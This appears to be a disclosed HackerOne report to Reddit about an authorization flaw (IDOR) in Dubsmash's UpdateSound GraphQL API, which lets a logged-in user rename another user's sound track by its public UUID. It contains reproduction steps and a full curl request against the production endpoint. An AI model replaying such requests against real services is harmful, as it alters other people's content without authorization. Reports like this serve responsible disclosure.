# [dubmash] Lack of authorization checks - Update Sound Titles

## Report Details
- **Report ID**: 1102365
- **URL**: https://hackerone.com/reports/1102365
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-02-12T20:02:18.541Z
- **Disclosed**: 2021-10-21T19:49:54.149Z

## Reporter
- **Username**: sandeep_rj49
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
## Summary:
During the security testing, it has been observed that the `UpdateSound` api is vulnerable to IDOR. It allows an attacker to edit the victim's sound track titles. This vulnerability can be exploited using the sound track's uuid in the vulnerable request. This id is publicly known. 


## Steps To Reproduce:
1. Replay the vulnerable request using a valid authorization token. 
2. Change the uuid parameter value with the victim's sound track UUID. 
3. Victim's sound track title will be changed. 

##Vulnerable request:
curl -i -s -k -X $'POST' \
    -H $'Host: gateway-production.dubsmash.com' -H $'X-Dmac: ' -H $'X-Remote-Config-Values: []' -H $'X-Time: 1613158267' -H $'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H $'X-Accept-Content-Language: en_IN' -H $'X-Device-Timezone: 19800' -H $'X-Device-Language: en' -H $'X-Device-Country: IN' -H $'X-Build-Number: 45431' -H $'Content-Length: 676' -H $'X-App-Version: 5.20.0' -H $'X-Platform: ios' -H $'Connection: close' -H $'Authorization: Bearer XXXXXX' -H $'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H $'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-Dmac-Version: 2' -H $'If-None-Match: W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' \
    -b $'__cfduid=' \
    --data-binary $'{\"query\":\"mutation UpdateSound($input: UpdateSoundInput!) {\\n  updateSound(input: $input) {\\n    __typename\\n    sound {\\n      __typename\\n      ...SoundFragment\\n    }\\n  }\\n}\\nfragment SoundFragment on Sound {\\n  __typename\\n  uuid\\n  created_at\\n  sound\\n  name\\n  waveform_raw_data\\n  liked\\n  soundStatus: status\\n  creator {\\n    __typename\\n    ...ContentCreatorFragment\\n  }\\n  share_link\\n  num_likes\\n  num_videos\\n}\\nfragment ContentCreatorFragment on User {\\n  __typename\\n  username\\n  uuid\\n  date_joined\\n  followed\\n  has_invite_badge\\n  badges\\n  profile_picture\\n}\",\"variables\":{\"input\":{\"uuid\":\"a687eb61ad814a09a8a85cedef7837f3\",\"name\":\"test12355556777\"}}}' \
    $'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'

## Impact

An attacker can change the title of the victim's sound track to some malicious title like accounthack or similar.

## Attachments
No attachments
